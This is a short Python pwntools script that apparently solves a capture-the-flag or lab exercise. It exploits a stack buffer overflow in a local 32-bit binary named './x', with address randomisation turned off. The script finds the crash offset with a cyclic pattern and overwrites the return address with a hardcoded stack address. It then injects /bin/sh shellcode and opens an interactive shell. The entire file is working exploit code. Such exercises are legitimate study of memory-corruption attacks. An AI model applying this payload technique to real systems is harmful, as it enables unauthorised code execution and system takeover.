import pwn

pwn.context.update(arch="x86", bits=32)

# print(repr(pwn.asm("""
# mov eax, 0
# int 0x80
# """)))

shellcode = pwn.asm(pwn.shellcraft.i386.linux.sh())

# with pwn.process("./x") as process:
#     pwn.gdb.attach(process, gdbscript="b *0x080491c7")
#     pwn.pause()
#     process.write(pwn.cyclic(256))
#     process.poll(True)


crash = 0x61616166
print(pwn.cyclic_find(crash))

redirect = 0xffffcf2c + 4


with pwn.process("./x", aslr=False) as process:
    # pwn.gdb.attach(process, gdbscript="b *0x080491f9")

    payload = b""
    payload += b"A" * 20
    payload += pwn.p32(redirect)
    payload += shellcode

    process.write(payload)
    process.interactive()
